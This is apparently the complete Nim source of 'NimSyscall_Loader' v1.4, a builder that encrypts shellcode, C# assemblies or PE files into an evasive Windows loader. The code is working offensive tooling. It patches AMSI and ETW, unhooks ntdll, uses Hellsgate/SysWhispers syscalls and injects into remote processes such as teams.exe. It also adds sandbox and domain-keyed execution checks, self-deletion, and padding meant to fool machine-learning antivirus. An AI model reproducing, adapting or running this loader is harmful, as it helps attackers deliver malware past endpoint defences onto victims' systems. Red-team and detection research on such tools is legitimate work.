#[

    Author: Fabian Mosch, Twitter: @ShitSecure
    Inspiration from: https://github.com/icyguider/nimcrypt/blob/main/nimcrypt.nim
]#

import nimcrypto
import nimcrypto/sysrand
import base64
import strformat
import strutils
import os
import osproc
import docopt
import std/math
import random

import HellsgateStubs
import CustomEvasionStubs
import GetSyscallStubs
import SandboxStubs
import Whispers


from system import io

func toByteSeq*(str: string): seq[byte] {.inline.} =
  ## Converts a string to the corresponding byte sequence.
  @(str.toOpenArrayByte(0, str.high))

proc toString(bytes: seq[byte]): string =
  result = newString(bytes.len)
  copyMem(result[0].addr, bytes[0].unsafeAddr, bytes.len)

proc rndStr(length: int): string =
  for _ in 0.. length:
    add(result, char(rand(int('a') .. int('z'))))


let banner = """
    _   ___          _____                       ____     __                    __         
   / | / (_)___ ___ / ___/__  ________________ _/ / /    / /   ____  ____ _____/ /__  _____
  /  |/ / / __ `__ \\__ \/ / / / ___/ ___/ __ `/ / /    / /   / __ \/ __ `/ __  / _ \/ ___/
 / /|  / / / / / / /__/ / /_/ (__  ) /__/ /_/ / / /    / /___/ /_/ / /_/ / /_/ /  __/ /    
/_/ |_/_/_/ /_/ /_/____/\__, /____/\___/\__,_/_/_/____/_____/\____/\__,_/\__,_/\___/_/     
                       /____/                   /_____/      --> @ShitSecure
                                                                 v1.4                                            

"""

echo banner

#Handle arguments

let helpmenu = """
NimSyscall_Loader v 1.4

Usage:
  NimSyscall_Loader --file=file_to_encrypt [--key=<key> --output=<output> --dll --dllexportfunc=<exportfuncname> --remoteprocess=<processnames> --csharp --noAMSI --noETW --sleep=<10> --shellcode --COMVARETW --remoteinject --remotepatchAMSI --remotepatchETW --unhook --reflective --obfuscate --hide --noArgs --peinject --peload --hellsgate --syswhispers --jump --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --x86]
  NimSyscall_Loader (-h | --help)
  NimSyscall_Loader --version

Options:
  -h --help     Show this screen.
  --version     Show version.
  --file filename  File to encrypt.
  --key key     Key to encrypt with
  --output filename    Filename for encrypted exe/dll
  --dll     Generate DLL instead of an exe
  --dllexportfunc exportfuncname    Comma separated names of DLL custom export functions
  --COMVARETW    Block ETW by setting COMPlus_ETWEnabled to 0
  --noETW    Don't use ETW Patch
  --noAMSI    Don't patch AMSI
  --csharp    Encrypt a C# Assembly to load it on runtime
  --noArgs    Don't provide any arguments to the assembly (some can only run without args)
  --shellcode    Encrypt shellcode to load it on runtime
  --sleep 10    Sleep 10 seconds before decryption to evade in memory scanners
  --remoteinject    Inject shellcode a newly spawned process (default notepad) / otherwise it's self injection
  --remoteprocess procname    Injects into the specified remote process name, e.g. teams.exe. The loader searches for the first process with that name
                     Can be used for multiple process names, e.g. --remoteprocess=teams.exe,iexplore.exe,MicrosoftEdge.exe -> First try teams, else Internet Explorer, last Edge
  --remotepatchAMSI    Patch AMSI in the remote process before shellcode execution
  --remotepatchETW    Patch ETW in the remote process before shellcode execution
  --unhook    Unhook ntdll.dll before doing anything else for the current process
  --reflective    Set compiler flags, so that the Loader Nim binary can be reflectively loaded
  --obfuscate    Compile the Nim binary via Denim to make use of LLVM obfuscation (not possible in combination with --reflective)
  --hide    Compile with --app:gui flag, so that the console won't pop up
  --peinject    Encrypt a PE to decrypt and run it on runtime as shellcode via donut
  --peload    Encrypt a PE to decrypt it on runtime and execute it via a syscall variant of Run-PE
  --hellsgate    Retrieve Syscalls via Hellsgate technique (for patching AMSI/ETW or shellcode execution/PE injection)
  --syswhispers    Embed Syscalls via Syswhispers3 (NimLineWhispers3) technique
  --jump    When using Syswhispers3, use the jumper_randomized technique
  --replace    Replace common nim IoC's in the loader like the string 'nim'
  --sandbox value    Include Sandbox Checks of your choice into the loader:
                     Domain -> Only execute if the target domain is == the --domain parameter's domain / If --domain is not set, it will only execute on non-domain joined systems
                     DomainJoined -> Only execute if the target is connected to ANY domain - you don't need to know the target's domain for this one
                     DiskSpace -> Only execute if c:\ disk space >= 200GB
                     MemorySpace -> Only execute if more than 4GB RAM available
  --pump value    Pump the file with:
                  words -> english dictionary words to increase the reputation for "mashine learning" evasion (https://twitter.com/hardwaterhacker/status/1502425183331799043)
                  reputation -> Pump reputation with strings from well known binaries e.g. Chrome,Cortana,Discord and some others
  --domain targetdomain    Specify a domain for SandBox Evasion
  --self-delete    The loader deletes it's own executable on runtime (Credit to @byt3bl33d3r and @jonasLyk)
  --obfuscatefunctions    Obfuscate some Nim specific Windows API's from the IAT via CallObfuscator (https://github.com/d35ha/CallObfuscator - only possible from a Windows OS)
  --debug    Compiles the binary in debug mode (More DInvoke output)
  --x86    (Compiles an x86 binary - have to cast some more function values before this works smoothly)
"""

if (paramCount() == 0):
    echo helpmenu
    quit(0)
if (paramStr(1) == "-h"):
    echo helpmenu
    quit(0)

var 
    filename: string = ""
    packerPath = os.getAppDir()
    outfile: string = packerPath
    envkey: string = "TARGETDOMAIN"
    dll_out: bool = false
    dllfunc: string = ""
    dllexportfunctions: seq[string]
    remoteprocesses : seq[string]
    targetdomain : string = ""
    processname: string = ""
    sandboxcheckfmt: string = ""
    sandboxchecks: seq[string]
    sandbox: bool = false
    csharp: bool = false
    AMSI: bool = true
    ETW: bool = true
    COMVARETW: bool = false
    shellcode: bool = true
    localinject: bool = true
    unhook: bool = false
    denim: bool = false
    gosleep: bool = false
    sleeptime: int = 0
    reflective: bool = false
    hide: bool = false
    noArgs: bool = false
    peinject: bool = false
    peload: bool = false
    callobfs: bool = false
    hellsgate: bool = false
    syswhispers: bool = false
    jump: bool = false
    getfreshstub: bool = true
    selfdelete: bool = false
    remoteAMSIpatch: bool = false
    remoteETWpatch: bool = false
    replace: bool = false
    pump: bool = false
    pumpfmt: string = ""
    pumpargs: seq[string]
    debugMode: bool = false
    compileX86: bool = false

let args = docopt(helpmenu, version = "NimSyscall_Loader 1.4")

if args["--file"]:
  let fname = args["--file"]
  filename = fmt"{fname}"
  echo filename

if args["--key"]:
  let keyname = args["--key"]
  envkey = fmt"{keyname}"

if args["--shellcode"]:
  shellcode = true
  csharp = false
  peload = false

if args["--csharp"]:
  csharp = true
  shellcode = false
  peload = false

if args["--peload"]:
  peload = true
  shellcode = false
  csharp = false

if args["--dll"]:
  dll_out = true
  if peload == true:
    echo "Warning: Argument passing to the PE will fail as the first argument is rundll32.exe or regsvr32.exe"

if args["--dllexportfunc"]:
  let dllfuncstring = args["--dllexportfunc"]
  dllfunc = fmt"{dllfuncstring}"
  dllexportfunctions = dllfunc.split(',')
  
when system.hostOS == "windows":
    if(dll_out):
        outfile.add("\\Loader.dll")
    else:
        outfile.add("\\Loader.exe")
else:
    if(dll_out):
        outfile.add("/Loader.dll")
    else:
        outfile.add("/Loader.exe")

if args["--output"]:
  let outname = args["--output"]
  outfile = fmt"{outname}"

if args["--remoteprocess"]:
  let remoteprocessesstring = args["--remoteprocess"]
  processname = fmt"{remoteprocessesstring}"
  echo processname
  remoteprocesses = processname.split(',')
  echo remoteprocesses

if args["--remotepatchAMSI"]:
  remoteAMSIpatch = true

if args["--remotepatchETW"]:
  remoteETWpatch = true

if args["--noAMSI"]:
  AMSI = false

if args["--noETW"]:
  ETW = false

if args["--COMVARETW"]:
  COMVARETW = true

if args["--unhook"]:
  unhook = true

if args["--sleep"]:
  sleeptime = parse_int($args["--sleep"])
  sleeptime = (sleeptime)
  gosleep = true

if args["--remoteinject"]:
  localinject = false

if args["--reflective"]:
  reflective = true

if args["--obfuscate"]:
  denim = true

if args["--hide"]:
  hide = true

if args["--noArgs"]:
  noArgs = true

if args["--peinject"]:
  peinject = true

if args["--hellsgate"]:
  hellsgate = true
  getfreshstub = false

if args["--syswhispers"]:
  syswhispers = true
  getfreshstub = false

if args["--jump"]:
  syswhispers = true
  jump = true

if args["--replace"]:
  replace = true

if args["--sandbox"]:
  sandbox = true
  let sandboxchecksargs = args["--sandbox"]
  sandboxcheckfmt = fmt"{sandboxchecksargs}"
  sandboxchecks = sandboxcheckfmt.split(',') 

if args["--pump"]:
  pump = true
  let pumptempargs = args["--pump"]
  pumpfmt = fmt"{pumptempargs}"
  pumpargs = pumpfmt.split(',') 

if args["--domain"]:
  let domainarg = args["--domain"]
  targetdomain = fmt"{domainarg}"

if args["--self-delete"]:
  selfdelete = true

if args["--obfuscatefunctions"]:
  callobfs = true

if args["--debug"]:
  debugMode = true

if args["--x86"]:
  compileX86 = true

var blob: string
#Read file and if PE convert to shellcode before
if (peinject):
    when system.hostOS == "windows":
        var exist: bool = fileExists("donut.exe")
    else:
        var exist: bool = true
    if (exist):
        when system.hostOS == "windows":
            discard os.execShellCmd(fmt"donut -f {filename} -b 1 -o tmpshellcode.bin")
        elif system.hostOS == "linux":
            discard os.execShellCmd(fmt"donut {filename} -b 1 -o tmpshellcode.bin")
        blob = readFile("tmpshellcode.bin")
        shellcode = true
        peload = false
    else:
        echo fmt"'Donut' not found. You need to download/install according to the README"
else:
    blob = readFile(filename)

var
    data: seq[byte] = toByteSeq(blob)

    ectx: CTR[aes256]
    key: array[aes256.sizeKey, byte]
    iv: array[aes256.sizeBlock, byte]
    plaintext = newSeq[byte](len(data))
    enctext = newSeq[byte](len(data))

# Create Random IV
discard randomBytes(addr iv[0], 16)

# We do not need to pad data, `CTR` mode works byte by byte.
copyMem(addr plaintext[0], addr data[0], len(data))

# Expand key to 32 bytes using SHA256 as the KDF
var expandedkey = sha256.digest(envkey)
copyMem(addr key[0], addr expandedkey.data[0], len(expandedkey.data))

ectx.init(key, iv)
ectx.encrypt(plaintext, enctext)
ectx.clear()

#let encoded = encode(enctext)
echo "Writing encrypted blob to disk: "

var content: string = cast[string](enctext)
writeFile("enc.blob", content)

let encodedIV = encode(iv)
let encodedenvkey = encode(envkey)


let RemoteProcImportStub = """
import osproc
"""

let AssemblyImports = """
from winim/clr import toCLRVariant,invoke,load,`.`,VT_BSTR
"""

let LoadAssemblyStub = """
var assembly = load(dectext)

when defined(lib_only):
    # https://stackoverflow.com/questions/12161813/running-a-dll-using-rundll32-exe-no-output-or-error-seen
    # https://stackoverflow.com/questions/432832/what-is-the-different-between-api-functions-allocconsole-and-attachconsole-1 to get DLL Console output
    AttachConsole(-1)

var cmd: seq[string]
var i = 1
while i <= paramCount():
    when defined(lib_only):
        if (i != 1):
            # first parameter is rundll32.exe,Funcname (skip that)
            cmd.add(paramStr(i))
    else:
        cmd.add(paramStr(i))
    inc(i)
"""

let LoadAssemblyStubArgs = """
var arr = toCLRVariant(cmd, VT_BSTR)
assembly.EntryPoint.Invoke(nil, toCLRVariant([arr]))
"""

let LoadAssemblyStubNoArgs = """
var arr = toCLRVariant([""], VT_BSTR) # Passing no arguments
assembly.EntryPoint.Invoke(nil, toCLRVariant([arr]))
"""

let WinLeanGetCurrentProcStub = """
from winlean import getCurrentProcess

"""

let Winimleanstub = """
import winim/lean
"""

let SleepStubSecond * = fmt"""
echo obf("[*] Sleeping to avoid in memory scanners")
echo {sleeptime}
HowMuchTimeWouldYoulikeToSleep({sleeptime}) 
"""

let DomainCheckStub1 * = fmt"""
when isMainModule:
    var localdomain: string = getDomain()
    if(localdomain != "{targetdomain}"):
        echo obf("Domain not EQUAL, target / local :") & $localdomain & " / {targetdomain}"
        quit()
"""

let ShellcoderemoteinjectStub_customprocseccond * = fmt"""
var remoteprocesses: seq[string] = {remoteprocesses}
"""

let Cryptstub1 = """
import winim/lean
#from dynlib import LibHandle, loadLib
# something seams to be still missing here
#from winim/lean import ULONG, PVOID, SIZE_T, PSIZE_T, DWORD_PTR,LPDWORD,WINBOOL,TRUE,FALSE,HMODULE,LPOVERLAPPED, PIMAGE_SECTION_HEADER, LPCSTR, LPVOID, HANDLE, DWORD, GENERIC_READ, FILE_SHARE_READ, LPSECURITY_ATTRIBUTES, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, PIMAGE_DOS_HEADER, PIMAGE_NT_HEADERS, IMAGE_DIRECTORY_ENTRY_EXPORT, IMAGE_FIRST_SECTION, IMAGE_SIZEOF_SECTION_HEADER, PIMAGE_EXPORT_DIRECTORY, PDWORD, BOOL, PULONG, NTSTATUS, PROCESS_ALL_ACCESS, FALSE, MEM_COMMIT, PAGE_EXECUTE_READ_WRITE, PAGE_READWRITE, CLIENT_ID, OBJECT_ATTRIBUTES
import dynlib
import strformat
from os import paramCount, paramStr
from nimcrypto import CTR, aes256, sizeKey, sizeBlock, sha256, digest, init, update, finish, clear, decrypt, encrypt
import base64
import strutils
import ptr_math
import strenc
import DInvoke

var success: BOOL

const encstring = slurp"enc.blob"

proc toString(bytes: openarray[byte]): string =
  result = newString(bytes.len)
  copyMem(result[0].addr, bytes[0].unsafeAddr, bytes.len)

### Modified code from Nim-Strenc to avoid XORing of long strings -> Modified by @chvancooten, credit to him
### Original source: https://github.com/Yardanico/nim-strenc
import macros, hashes

type
    estring = distinct string

proc calcTheThings(s: estring, key: int): string {.noinline.} =
    var k = key
    result = string(s)
    for i in 0 ..< result.len:
        for f in [0, 8, 16, 24]:
            result[i] = chr(uint8(result[i]) xor uint8((k shr f) and 0xFF))
    k = k +% 1

var eCtr {.compileTime.} = hash(CompileTime & CompileDate) and 0x7FFFFFFF

macro obf*(s: untyped): untyped =
    if len($s) < 10000:
        var encodedStr = calcTheThings(estring($s), eCtr)
        result = quote do:
            calcTheThings(estring(`encodedStr`), `eCtr`)
        eCtr = (eCtr *% 16777619) and 0x7FFFFFFF
    else:
        result = s

# Decrypt.nim
func toByteSeq*(str: string): seq[byte] {.inline.} =
  ## Converts a string to the corresponding byte sequence.
  @(str.toOpenArrayByte(0, str.high))

var dctx: CTR[aes256]
"""

let Cryptstub2 = fmt"""
var enctext: seq[byte] = toByteSeq(encstring)
var key: array[aes256.sizeKey, byte]
var envkey: string = decode("{encodedenvkey}")
var iv: array[aes256.sizeBlock, byte]
var pp: string = decode("{encodedIV}")
"""

let Cryptstub3 = fmt"""
# Decode and save IV
copyMem(addr iv[0], addr pp[0], len(pp))

# Encrypt Key
var expandedkey = sha256.digest(envkey)
copyMem(addr key[0], addr expandedkey.data[0], len(expandedkey.data))

var dectext = newSeq[byte](len(enctext))

# Decrypt
dctx.init(key, iv)
dctx.decrypt(enctext, dectext)
dctx.clear()

"""

let RemoteModuleHandleStub = """

# Credit to @whydee86 - https://github.com/whydee86/SnD_AMSI/blob/main/Remote.nim

from winim import PROCESSENTRY32A,CreateToolhelp32Snapshot,TH32CS_SNAPPROCESS,PROCESSENTRY32,Process32FirstA,Process32NextA,MODULEENTRY32A,TH32CS_SNAPMODULE,Module32FirstA,Module32NextA

proc ConvertToString(CharArr :array[256,char]): string =
    var index = 0
    while CharArr[index] != '\x00':
        result.add(CharArr[index])
        index += 1

proc GetRemoteModuleHandle * (hProcess:HANDLE, ModuleName: string): HMODULE =
    var 
        modEntry : MODULEENTRY32A
        snapshot : HANDLE

    snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE,GetProcessId(hProcess))
    if snapshot != INVALID_HANDLE_VALUE:
        modEntry.dwSize = DWORD(sizeof(MODULEENTRY32A))
        if Module32FirstA(snapshot, addr modEntry):
            while Module32NextA(snapshot, addr modEntry):
                if ConvertToString(modEntry.szModule) == ModuleName:
                    return modEntry.hModule
    CloseHandle(snapshot)
    return 0

proc GetRemoteProcAddress * (hProcess : HANDLE, hModule : HMODULE, FuncName : string): FARPROC =
    var
        baseModule : UINT_PTR = cast[UINT64](hModule)
        dosHeader : IMAGE_DOS_HEADER
        ntHeader : IMAGE_NT_HEADERS
        exportDirectory : IMAGE_EXPORT_DIRECTORY
        ExportTable : DWORD = 0
        ExportFunctionTableVA : UINT_PTR = 0
        ExportNameTableVA : UINT_PTR = 0
        ExportOrdinalTableVA : UINT_PTR = 0
        ExportNameTable: seq[DWORD]
        ExportFunctionTable: seq[DWORD]
        ExportOrdinalsTable: seq[WORD] 
        MinFunNumber : UINT_PTR = 0
        Func : DWORD = 0
        Ord : WORD = 0
        CharIndex : UINT_PTR = 0
        TempChar : char
        Done : bool = false
        TempFunctionName : string = ""

    if ReadProcessMemory(hProcess, cast[LPCVOID](baseModule), addr dosHeader, sizeof(dosHeader), NULL) == 0:
        echo obf("Failed to Read the DOS header and check it's magic number: "), GetlastError()
        return NULL
    if ReadProcessMemory(hProcess, cast[LPCVOID](baseModule + dosHeader.e_lfanew), addr ntHeader, sizeof(ntHeader), NULL) == 0:
        echo obf("Failed to Read and check the NT signature: "), GetlastError()
        return NULL

    ExportTable = (ntHeader.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]).VirtualAddress
    
    if ReadProcessMemory(hProcess, cast[LPCVOID](baseModule + ExportTable), addr exportDirectory, sizeof(exportDirectory), NULL) == 0:
        echo obf("Failed to Read the main export table "), GetlastError()

    ExportFunctionTableVA = cast[UINT_PTR](baseModule) + exportDirectory.AddressOfFunctions
    ExportNameTableVA = cast[UINT_PTR](baseModule) + exportDirectory.AddressOfNames
    ExportOrdinalTableVA = cast[UINT_PTR](baseModule) + exportDirectory.AddressOfNameOrdinals
    
    for FunNum in MinFunNumber .. exportDirectory.NumberOfNames:
        Func = 0
        Ord = 0 
        if ReadProcessMemory(hProcess, cast[LPCVOID](ExportNameTableVA + FunNum * sizeof(DWORD)), addr Func, sizeof(Func), NULL) == 0:
            echo obf("Failed to copy name table "), GetlastError()
            return NULL
        if ReadProcessMemory(hProcess, cast[LPCVOID](ExportOrdinalTableVA + FunNum * sizeof(WORD)), addr Ord, sizeof(Ord), NULL) == 0:
            echo obf("Failed to copy Ordinal table "), GetlastError()
            return NULL
        ExportNameTable.add(Func)
        ExportOrdinalsTable.add(Ord)
    
    for FunNum in MinFunNumber .. exportDirectory.NumberOfFunctions:
        Func = 0
        if ReadProcessMemory(hProcess, cast[LPCVOID](ExportFunctionTableVA + FunNum * sizeof(DWORD)), addr Func, sizeof(Func), NULL) == 0:
            echo obf("Failed to copy fucntion table "), GetlastError()
            return NULL
        ExportFunctionTable.add(Func)
    
    for FunNum in MinFunNumber .. exportDirectory.NumberOfNames:
        CharIndex = 0
        Done = false
        TempFunctionName = ""
        while Done == false:
            if ReadProcessMemory(hProcess, cast[LPCVOID](baseModule + ExportNameTable[FunNum] + CharIndex), addr TempChar, sizeof(TempChar), NULL) == 0:
                echo obf("Failed to read the names of the functions"), GetlastError()
                return NULL
            if TempChar == '\0' or TempChar == '`' or TempChar == '\176':
                Done = true
            else:
                TempFunctionName.add(TempChar)
            CharIndex += 1
        if TempFunctionName == FuncName:
            return cast[FARPROC](baseModule + ExportFunctionTable[ExportOrdinalsTable[FunNum]])
    echo obf("[X] Proc name does not exits")
    return NULL

"""


proc genEnglishwords (nuofWords: int): string =

  proc pumpenglishwords (numberofWords: int): seq[string] =

    var englishdicts: seq[string]
    var output: seq[string]
    var dictionary: string
    when system.hostOS == "windows":
        dictionary = fmt"{packerPath}\\Dicts\\englishwords.txt"
    else:
        dictionary = fmt"{packerPath}\\Dicts/englishwords.txt"
    for line in lines dictionary:
      englishdicts.add(line)
    for i in 1 .. numberofWords:
      output.add(sample(englishdicts))
    return output

  proc rndStr: string =
    for _ in 0.. 10:
      add(result, char(rand(int('a') .. int('z'))))
    
  var rand1: seq[string] = pumpenglishwords(nuofWords)
  var rand2: string = rndStr()

  let englishwordsstub = fmt"""

var {rand2} = {rand1}

"""
  return englishwordsstub


proc genTrustedwords (nuofWords: int): string =

  proc pumpTrustedwords (numberofWords: int): seq[string] =

    var trusteddicts: seq[string]
    var output: seq[string]
    var dictionary: string
    when system.hostOS == "windows":
        dictionary = fmt"{packerPath}\\Dicts\\trustedStrings.txt"
    else:
        dictionary = fmt"{packerPath}/Dicts/trustedStrings.txt"
    for line in lines dictionary:
      trusteddicts.add(line)
    for i in 1 .. numberofWords:
      output.add(sample(trusteddicts))
    return output

  proc rndStr: string =
    for _ in 0.. 10:
      add(result, char(rand(int('a') .. int('z'))))
    
  var rand1: seq[string] = pumpTrustedwords(nuofWords)
  var rand2: string = rndStr()

  let trustedwordsstub = fmt"""

var {rand2} = {rand1}

"""

  return trustedwordsstub

let DllStub = """
proc NimMain() {.cdecl, importc.}

proc DllRegisterServer(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : bool {.stdcall, exportc, dynlib.} =
    NimMain()
    return true

proc DllUnregisterServer(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : bool {.stdcall, exportc, dynlib.} =
    NimMain()
    return true

proc DllInstall(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : bool {.stdcall, exportc, dynlib.} =
    NimMain()
    return true
"""

let DllCustomExportStub = """
proc FUNC_EXPORT(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
    NimMain()
    return true
"""

let DllStubRemoteInj = """
proc DllRegisterServer(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : bool {.stdcall, exportc, dynlib.} =
    return true

proc DllUnregisterServer(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : bool {.stdcall, exportc, dynlib.} =
    return true

proc DllInstall(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : bool {.stdcall, exportc, dynlib.} =
    return true
"""

let DllCustomExportStubRemoteInj = """
proc FUNC_EXPORT(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
    return true
"""

var stub = Cryptstub1
stub.add(DInvokeBaseStub)

if(pump):
    # makes no sense to import strenc when strings should be visible in the binary.
    stub =  stub.replace("import strenc", "")
    for m in pumpargs:
        if(m == "words"):
            echo "[*] Adding words"
            stub.add(genEnglishwords(rand(4750..7800)))
        if (m == "reputation"):
            echo "[*] Adding reputation"
            stub.add(genTrustedwords(rand(3500..6200)))

if(sandbox):
    stub.add(DInvokeSandBoxStub)
    for m in sandboxchecks:
        if(m == "Domain"):
            stub.add(DomainCheckStub)
            stub.add(DomainCheckStub1)
        if (m == "DiskSpace"):
            stub.add(DiskSpaceStub)
        if (m == "DomainJoined"):
            stub.add(DomainJoinStub)
        if (m == "MemorySpace"):
            stub.add(MemorySpaceStub)

if(gosleep):
    stub.add(SleepStubFirst)
    stub.add(SleepStubSecond)


if (getfreshstub):
    stub.add(GetSyscallStub)
    stub.add(NtProtectSyscallStart)

if (syswhispers):
    if(jump):
        stub.add(WhispersJumpStub)
    else:
        stub.add(WhispersStub)

if(unhook):
    if(hellsgate):
        stub.add(DInvokeUnhookStubs)
        stub.add(Winimleanstub)
        stub.add(WinLeanGetCurrentProcStub)
        stub.add(HellsgateStub)
        stub.add(HellsgateProtectDelegate)
        stub.add(HellsgateWriteDelegate)
        stub.add(HellsgateNtCloseDelegate)
        stub.add(HellsgateUnhookStub)
    elif(getfreshstub):
        stub.add(DInvokeUnhookStubs)
        stub.add(Winimleanstub)
        stub.add(NtProtectVirtualMemoryDelegate)
        stub.add(NtWriteVirtualMemoryDelegate)
        stub.add(NtCloseDelegate)
        stub.add(UnhookSyscalls)
        stub.add(UnhookStub)
    elif(syswhispers):
        stub.add(DInvokeUnhookStubs)
        stub.add(Winimleanstub)
        stub.add(WhispersUnhookStub)
else:
    if(hellsgate):
        stub.add(WinLeanGetCurrentProcStub)
        stub.add(HellsgateStub)
        stub.add(HellsgateProtectDelegate)
        stub.add(HellsgateWriteDelegate)
        stub.add(HellsgateNtCloseDelegate)
    elif(getfreshstub):
        stub.add(NtProtectVirtualMemoryDelegate)
        stub.add(NtWriteVirtualMemoryDelegate)

# Only decrypt when sandbox Checks/Unhooking/Sleep is done
stub.add(Cryptstub2)
stub.add(Cryptstub3)

if (AMSI or ETW or peload or (localinject == false) or selfdelete):
    stub.add(DInvokeLoadLibraryAGetProcAddress)
    if (selfdelete):
        stub.add(DInvokeSelfDeleteStubs)
        stub.add(FileDeleteStub)

if (localinject):
    if (AMSI):
        if (syswhispers):
            stub.add(WhispersAMSIPatchStub)
        if (hellsgate):
            stub.add(HellsgateAMSIPatchStub)
        elif(getfreshstub):
            stub.add(AMSIStub)
    if (ETW):
        if (COMVARETW):
            stub.add(ETWCOMVARStub)
        else:
            if (syswhispers):
                stub.add(WhispersETWPatchStub)
            if (hellsgate):
                stub.add(HellsgateETWPatchStub)
            elif(getfreshstub):
                stub.add(ETWPatchStub)

if (remoteETWpatch or remoteAMSIpatch):
    stub.add(RemoteModuleHandleStub)
    if (gosleep == false):
        stub.add(SleepStubFirst)
    if (unhook == false):
        stub.add(DInvokeGetModuleHandleADelegate)

if(dll_out):
    if (processname == ""):
        stub.add(DllStub)
        for f in dllexportfunctions:
            stub.add(DllCustomExportStub)
            stub = stub.replace("FUNC_EXPORT", f)
    else:
        stub.add(DllStubRemoteInj)
        for f in dllexportfunctions:
            stub.add(DllCustomExportStubRemoteInj)
            stub = stub.replace("FUNC_EXPORT", f)

if (peload):
    if (localinject):
        if (hellsgate):
            stub.add(HellsgateAllocDelegate)
            stub.add(HellsPELoadStub)
        elif(getfreshstub):
            stub.add(NtAllocateVirtualMemoryDelegate)
            stub.add(ProtectWriteAllocSyscalls)
            stub.add(PELoadStub)
        elif(syswhispers):
            stub.add(WhispersPELoadStub)
    else:   
        stub.add(RemoteProcImportStub)
        if (hellsgate):
            stub.add(HellsgateNtOpenProcessDelegate)
            stub.add(HellsgateAllocDelegate)
            stub.add(HellsgateNtCreateThreadExDelegate)
            if (processname == ""):
                stub.add(HellsgateNotepadProcIDStub)
                if (remoteETWpatch):
                    stub.add(HellsgateRemotePatchETWStub)
                if (remoteAMSIpatch):
                    stub.add(HellsgateRemotePatchAMSIStub)
                stub.add(HellsShellcoderemoteinjectStub_notepad)
                stub.add(HellsShellcoderemoteinjectStub)
            else:
                stub.add(HellsShellcoderemoteinjectStub_customprocfirst)
                stub.add(ShellcoderemoteinjectStub_customprocseccond)
                stub.add(HellsShellcoderemoteinjectStub_customprocID)
                if (remoteETWpatch):
                    stub.add(HellsgateRemotePatchETWStub)
                if (remoteAMSIpatch):
                    stub.add(HellsgateRemotePatchAMSIStub)
                stub.add(HellsShellcoderemoteinjectStub_customprocthird)
                stub.add(HellsShellcoderemoteinjectStub)

if (shellcode):
    if (localinject):
        if (getfreshstub):
            stub.add(LocalInjectDelegates)
            stub.add(ShellcodelocalStub)
        if (hellsgate):
            stub.add(HellsgateAllocDelegate)
            stub.add(HellsgateLocalInjectStub)
        elif(syswhispers):
            stub.add(WhispersLocalInjectStub)
    else:
        stub.add(Winimleanstub)
        if (getfreshstub):
            stub.add(RemoteProcImportStub)
        if (hellsgate):
            stub.add(HellsgateNtOpenProcessDelegate)
            stub.add(HellsgateAllocDelegate)
            stub.add(HellsgateNtCreateThreadExDelegate)
            if (processname == ""):
                stub.add(HellsgateNotepadProcIDStub)
                if (remoteETWpatch):
                    stub.add(HellsgateRemotePatchETWStub)
                if (remoteAMSIpatch):
                    stub.add(HellsgateRemotePatchAMSIStub)
                stub.add(HellsShellcoderemoteinjectStub_notepad)
                stub.add(HellsShellcoderemoteinjectStub)
            else:
                stub.add(HellsShellcoderemoteinjectStub_customprocfirst)
                stub.add(ShellcoderemoteinjectStub_customprocseccond)
                stub.add(HellsShellcoderemoteinjectStub_customprocID)
                if (remoteETWpatch):
                    stub.add(HellsgateRemotePatchETWStub)
                if (remoteAMSIpatch):
                    stub.add(HellsgateRemotePatchAMSIStub)
                stub.add(HellsShellcoderemoteinjectStub_customprocthird)
                stub.add(HellsShellcoderemoteinjectStub)
        elif(syswhispers):
            if (processname == ""):
                stub.add(WhispersNotepadProcIDStub)
                if (remoteETWpatch):
                    stub.add(WhispersRemotePatchETWStub)
                if (remoteAMSIpatch):
                    stub.add(WhispersRemotePatchAMSIStub)
                stub.add(WhispersShellcoderemoteinjectStub_notepad)
                stub.add(WhispersShellcoderemoteinjectStub)
            else:
                stub.add(WhispersShellcoderemoteinjectStub_customprocfirst)
                stub.add(ShellcoderemoteinjectStub_customprocseccond)
                stub.add(WhispersShellcoderemoteinjectStub_customprocID)
                if (remoteETWpatch):
                    stub.add(WhispersRemotePatchETWStub)
                if (remoteAMSIpatch):
                    stub.add(WhispersRemotePatchAMSIStub)
                stub.add(WhispersShellcoderemoteinjectStub_customprocthird)
                stub.add(WhispersShellcoderemoteinjectStub)
        elif (getfreshstub):
            stub.add(RemoteInjectDelegates)
            if (processname == ""):
                stub.add(NotepadProcIDStub)
                if (remoteETWpatch):
                    stub.add(RemoteLoadNTDLLStub)
                    stub.add(RemotePatchETWStub)
                if (remoteAMSIpatch):
                    stub.add(RemoteLoadAMSIStub)
                    stub.add(RemotePatchAMSIStub)
                stub.add(ShellcoderemoteinjectStub_notepad)
                stub.add(ShellcoderemoteinjectStub)
            else:
                stub.add(ShellcoderemoteinjectStub_customprocfirst)
                stub.add(ShellcoderemoteinjectStub_customprocseccond)
                stub.add(ShellcoderemoteinjectStub_customprocID)
                if (remoteETWpatch):
                    stub.add(RemoteLoadNTDLLStub)
                    stub.add(RemotePatchETWStub)
                if (remoteAMSIpatch):
                    stub.add(RemoteLoadAMSIStub)
                    stub.add(RemotePatchAMSIStub)
                stub.add(ShellcoderemoteinjectStub_customprocthird)
                stub.add(ShellcoderemoteinjectStub)

if (csharp):
    stub.add(AssemblyImports)
    if (noArgs):
        stub.add(LoadAssemblyStub)
        stub.add(LoadAssemblyStubNoArgs)
    else:
        stub.add(LoadAssemblyStub)
        stub.add(LoadAssemblyStubArgs)

if (pump):
    for m in pumpargs:
        if(m == "words"):
            stub.add(genEnglishwords(rand(4750..7800)))

if (debugMode):
    stub = stub.replace("import strenc", "")

writeFile("Loader.nim", stub)
echo "Written Loader.nim, compiling -> \n\n"


